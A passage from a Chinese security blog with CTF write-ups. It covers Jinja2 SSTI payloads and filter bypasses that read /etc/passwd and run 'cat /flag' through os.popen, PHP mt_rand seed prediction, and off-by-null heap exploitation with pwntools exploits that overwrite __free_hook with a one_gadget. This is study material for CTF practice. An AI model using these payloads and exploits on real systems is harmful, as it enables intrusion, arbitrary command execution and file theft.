<h4 id="利用open函数读取文件"><a href="#利用open函数读取文件" class="headerlink" title="利用open函数读取文件"></a>利用<code>open</code>函数读取文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.__globals__.__builtins__.open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read()&#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;##&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="import导入os模块利用"><a href="#import导入os模块利用" class="headerlink" title="import导入os模块利用"></a><code>import</code>导入<code>os</code>模块利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.__globals__.__builtins__[&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;   &#123;# listdir函数列出 #&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>&#96;&#96;&#96;&#96;&#96;</p>
<ul>
<li><p><code>|capitalize</code>是一个过滤器，会将<code>variable</code>的值通过<code>capitalize</code>方法处理后再输出。</p>
</li>
<li><p><code>capitalize</code>方法会将字符串的首字母大写，其他字母小写。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">template_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;&#123;name|capitalize&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">template = Template(template_string)</span><br><span class="line">output = template.render(name=<span class="string">&quot;it&#x27;s Very Good!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(output)   <span class="comment">#输出：It&#x27;s very good!</span></span><br></pre></td></tr></table></figure>



<ul>
<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
<li><code>__subclasses__</code>：返回当前类的子类，也可以通过索引的方式定位一个子类。</li>
<li><code>__init__</code>：类的初始化方法。</li>
</ul>
<h4 id="join"><a href="#join" class="headerlink" title="|join"></a><code>|join</code></h4><p><code>|join</code>过滤器，用于将列表中的元素连接成一个字符串。</p>
<ul>
<li><code>__dict__</code>：保存类实例或对象实例的属性变量键值对字典</li>
<li><code>__globals__</code>：对包含函数全局变量的字典的引用。</li>
<li><code>__builtin__</code>：</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">__builtin__</span>&amp;&amp;<span class="emphasis">__builtins__</span>　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在<span class="emphasis">__builtin__</span>可以查到。查看的方法是dir(<span class="emphasis">__builtins__</span>)　　　　　　　　　　　　　　　　　　在py3中<span class="emphasis">__builtin__</span>被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，<span class="emphasis">__builtins__</span>是对内建模块<span class="emphasis">__builtin__</span>本身的引用，即<span class="emphasis">__builtins__</span>完全等价于<span class="emphasis">__builtin__</span>。　　　　　　　　　　　　　　　　　　2.非主模块main中，<span class="emphasis">__builtins__</span>仅是对<span class="emphasis">__builtin__</span>.<span class="emphasis">__dict__</span>的引用，而非<span class="emphasis">__builtin__</span>本身</span><br></pre></td></tr></table></figure>

<h3 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></h3><p>过滤了<code>&#123;&#123;&#125;&#125;</code>，通过<code>&#123;% %&#125;</code>代替，还过滤了一些危险字符和字符串，我们只能自己设置和拼接了。</p>
<h4 id="设置特殊字符"><a href="#设置特殊字符" class="headerlink" title="设置特殊字符"></a>设置特殊字符</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum) %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102002607.png" alt="image-20241004190352946"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>) %&#125;  <span class="comment">#设置xhx为&#x27;_&#x27;下划线</span></span><br><span class="line">&#123;% <span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>) %&#125;  <span class="comment">#设置kg为&#x27; &#x27;空格</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102002678.png" alt="image-20241004190630920"></p>
<p>发现<code>lipsum</code>中缺少了我们需要的<code>/</code>字符，可以通过<code>config</code>设置，前两个字符在<code>config</code>中也能找到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(config) %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102001614.png" alt="image-20241004190120138"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(config|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xg=(config|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">239</span>) %&#125;  <span class="comment">#设置xg为&#x27;/&#x27;斜杠</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102001244.png" alt="image-20241004190604117"></p>
<h4 id="拼接并设置关键字符串"><a href="#拼接并设置关键字符串" class="headerlink" title="拼接并设置关键字符串"></a>拼接并设置关键字符串</h4><p><code>|join</code>过滤器，用于将列表中的元素连接成一个字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xhx:_   kg:空格   xg:/</span></span><br><span class="line"><span class="comment">#设置globals为拼接后的 __globals__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> gl=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=b)|join,xhx,xhx)|join %&#125;</span><br><span class="line"><span class="comment">#设置gi为拼接后的 __getitem__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> gi=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=b)|join,xhx,xhx)|join %&#125;</span><br><span class="line"><span class="comment">#设置so为拼接后的 os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> so=<span class="built_in">dict</span>(o=a,s=b)|join %&#125;</span><br><span class="line"><span class="comment">#设置pp为拼接后的 popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line"><span class="comment">#设置shell为拼接后的 cat /flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(<span class="built_in">dict</span>(cat=a)|join,kg,xg,<span class="built_in">dict</span>(flag=a)|join)|join %&#125;</span><br><span class="line"><span class="comment">#设置read为 read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="拼接payload"><a href="#拼接payload" class="headerlink" title="拼接payload"></a>拼接<code>payload</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload原型</span></span><br><span class="line">&#123;&#123;lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br><span class="line"><span class="comment">#拼接payload</span></span><br><span class="line">&#123;% <span class="built_in">print</span>(lipsum|attr(<span class="built_in">globals</span>)|attr(gi)(so)|attr(pp)(shell)|attr(read)()) %&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%0aop=<span class="built_in">dict</span>(op=<span class="number">1</span>)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0axhx=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">74</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0akg=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">7</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0axg=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">279</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0agl=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=b)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0agi=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=b)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%<span class="number">0</span>aso=<span class="built_in">dict</span>(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0app=<span class="built_in">dict</span>(po=a,pen=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%<span class="number">0</span>ashell=(<span class="built_in">dict</span>(cat=a)|join,kg,xg,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0ara=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(gl)|attr(gi)(so)|attr(pp)(shell)|attr(ra)())%&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>mt_rand()漏洞</title>
    <url>/2025/02/07/mt-rand-%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="mt-srand-和mt-rand"><a href="#mt-srand-和mt-rand" class="headerlink" title="mt_srand()和mt_rand()"></a>mt_srand()和mt_rand()</h2><p>mt_srand()函数用于设置Mersenne Twister随机数生成器的种子值，mt_rand()函数会依据种子生成伪随机数。下面是一个示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>运行上述代码，<strong>会发现三个结果不一样，但是每次运行得到的结果都不变</strong>。其实是因为mt_srand(seed)中的seed是确定的，故而同次序下mt_rand()每次生成的随机数一样。</p>
<p>这样也就产生了漏洞：由其中一个随机数，去得到seed，然后就能预测其他随机数。</p>
<h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p><a href="https://www.openwall.com/php_mt_seed/">下载地址</a></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272318982.png" alt="image-20250207213933475"></p>
<p>直接下载压缩包到kali中，然后执行下面命令即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf php_mt_seed-4.0.tar.gz</span><br><span class="line">make   <span class="comment">#初始化，获得一个文件php_mt_seed</span></span><br><span class="line"><span class="built_in">chmod</span> 777 php_mt_seed   <span class="comment">#添加权限</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;0aa9ccfe-dfc6-4c0b-954d-dd55e41194db&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br></pre></td></tr></table></figure>

<p>分析代码可知，已知一个随机数为 1219893521，如果能知道第二个随机数的值便能获得flag。</p>
<p>既然知道其中一个随机数了，便能利用php_mt_seed工具爆破seed，如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272319041.png" alt="image-20250207220635329"></p>
<p>得到不同版本php的seed，利用Wappalyzer插件获取题目中的php版本。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>php函数漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-null学习笔记</title>
    <url>/2024/07/19/off-by-null%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
<ol>
<li>这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</li>
<li>另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ol>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先我们要用到四个chunk</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span>#merged chunk     （不能让这个堆块在fastbin或是tcachebin中）</span><br><span class="line">chunk <span class="number">1</span>#overflow chunk&amp;&amp;spy chunk</span><br><span class="line">chunk <span class="number">2</span>#merge chunk      （不能让这个堆块在fastbin或是tcachebin中）</span><br><span class="line">chunk <span class="number">3</span>#prevent merge chunk #防止和top chunk合并</span><br></pre></td></tr></table></figure>

<p>这四个堆块对应的名字我也做了标注</p>
<blockquote>
<p>1、先将这四个chunk都申请出来，注意merged chunk和merge chunk的大小，不能让他们在tcachebin或者fastbin中（不然就无法合并了），同时还要考虑overflow chunk的大小，因为要产生off by null，所以它的大小应该为八字节结尾（例如0x58,0x68,0x78···），然后释放掉merged chunk，为了保证接下来的合并可以顺利进行</p>
<p>2、接着编辑 overflow chunk，让他产生off by null漏洞溢出空字节到merge chunk的prev inuse位，同时把merge chunk的prev inuse位给改了（其大小要保证当前地址减去这个prev size正好能找到merged chunk（如果程序中没有编辑功能，那就将overflow chunk free掉，再申请回来写入数据造成溢出）。</p>
<p>3、然后释放掉merge chunk，此时检测到自身的prev inuse位是0，触发向前合并（先会触发向后合并，不过只要后面的那个chunk不是Top chunk就不会合并)（我个人习惯将向低地址合并称为向前合并）</p>
<p>4、最终由于merge chunk合并时直接找到了merged chunk，因此这二者之间的所有区域都处于了free状态，但是这二者之间其实还有一个<strong>spy_chunk（我把它叫做间谍堆块，因为它没有被free掉却处于了free的合并区域）</strong></p>
<p>剩下的就具体题目具体分析吧，反正接下来的利用就是要配合spy_chunk的特性（它的特性就是它出在free的区域，但是自己是没有被free掉的，然后就可以打double free、堆块重叠等等）</p>
</blockquote>
<blockquote>
<p>为什么要利用off by null让chunk的prev inuse位成0？</p>
<p>因为当前chunk的prev inuse位决定了上个堆块是否处于free状态，这也就决定着是否能够向前合并（我个人习惯将向低地址合并称为向前合并）。我们确实释放了上个堆块，但是改变的是spy_chunk的prev inuse位，不过我们现在想忽略这个spy_chunk，因此要将当前chunk的prev_size位伪造成0，来保证之后的向前合并可以正常进行。</p>
</blockquote>
<h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a><em>hitcon_2018_children_tcache</em></h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="利用知识"><a href="#利用知识" class="headerlink" title="利用知识"></a>利用知识</h4><ol>
<li>**<code>prev_inuse</code>**：是一个标志位，用于指示前一个_chunk_是否已经被分配。如果_prev_inuse_为<code>1</code>，则表示前一个_chunk_已被分配；反之，则是空闲的。_prev_inuse_可能会被编码在_prev_size_的某个位上，如最低位。</li>
<li>对于_smalls bin_，_large bins_，_unsorted bin_这三类_bin_，<strong>任意两个物理相邻的空闲_chunk_不能在一起，因为会被合并</strong>。</li>
</ol>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>整体思路如下：</p>
<ol>
<li>利用_off-by-null_，使_chunk_的_prev_inuse_位为<code>0</code>，合并_chunk_，泄漏_libc_</li>
<li>利用_double free_，覆盖___free_hook_里的地址为_one_gadget_地址</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p,e,libc = load(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27393</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1029</span>)<span class="comment">#0x101D,0x1035,</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Data:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add((<span class="number">0x47</span>-i),<span class="string">&#x27;f&#x27;</span>*(<span class="number">0x47</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x550</span>)</span><br><span class="line">add(<span class="number">0x48</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;free_hook&quot;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget[<span class="number">2</span>]</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a><em>asis2016_b00ks</em></h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>程序中有一个结构体，_book_struct_结构体如下，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">void</span> *book_name;</span><br><span class="line">    <span class="type">void</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	程序中的<code>bss_0x202040</code>处存储着_author_name_，大小为<code>0x20</code>个字节。从<code>bss_0x202060</code>处开始，存储着指向<code>book_struct</code>结构体的_hook_。我们每_add_一次，会创建<code>3</code>个_chunk_，前两个_chunk_用来存放_book_name_和_description_。第三个_chunk_的大小固定为<code>0x30</code>，<em>user_data_的顺序依次为_id_，</em>*book_name_（即_chunk1_的_user_data_的地址），_*description_（即_chunk2_的_user_data_的地址）,_description_size_。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407191543115.png" alt="image-20240719154331012"></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><h4 id="泄漏-book-struct-地址"><a href="#泄漏-book-struct-地址" class="headerlink" title="泄漏_book_struct_地址"></a>泄漏_book_struct_地址</h4><p>​	由于<code>0x20</code>个字节的_author name_后面，紧接着就是_book_struct_的地址。所以我们直接填满这<code>0x20</code>个字节，然后再_show_打印出来的_author_自然就会把后面的内容带出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#使被\x00覆盖后的book_struct1的地址，是chunk_des1的user_data的首地址。具体的size和偏移自己计算</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x21000</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">book1_struct_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#-0x21e81a0</span></span><br><span class="line">log_addr(<span class="string">&quot;book1_struct_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏_libc_"></a>泄漏_libc_</h4><p>​	本题的漏洞点是_off-by-null_，会使_author name_的后一个数据的最后一个字节为<code>\x00</code>，如图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407200929980.png" alt="image-20240720092942858"></p>
<p>​	此时，<code>0x55eae550f100</code>是_book_struct1_的地址，如果我们提前在_chunk_des1_里构造一个_fake_struct_，那么溢出_null_后，该_fake_struct_就会变成_id_为<code>1</code>的_book_struct_（因为到底谁是_book_struct_是由<code>bss_0x202060</code>处的数据决定的）。然后也能打印出_fake_struct_中的_*book_des_指向的内容，而_fake_struct_中的_*book_des_是由我们自己输入的，所以也就实现了任意地址泄漏。</p>
<p>​	接下来，我们该到哪里去找一个_libc_地址来泄漏呢？并且这个_libc_地址的指针还要能通过_book_struct_地址计算偏移量得到。</p>
<p>​	我们可以&#x3D;&#x3D;申请一个超大的_chunk_用来存储_book_des2_，然后_mmap_内存后，_*book_des2_就会是一个_libc_地址&#x3D;&#x3D;。然后把存储_*book_des2_的地址布置到_fake_struct_中即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(book1_struct_addr+<span class="number">0x60</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">change_name(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x5ca010</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="覆盖-free-hook"><a href="#覆盖-free-hook" class="headerlink" title="覆盖**__free_hook**"></a>覆盖**<code>__free_hook</code>**</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;free_hook&quot;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget[<span class="number">1</span>]</span><br><span class="line">payload = p64(free_hook)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><p>只能通本地，远程通不了</p>
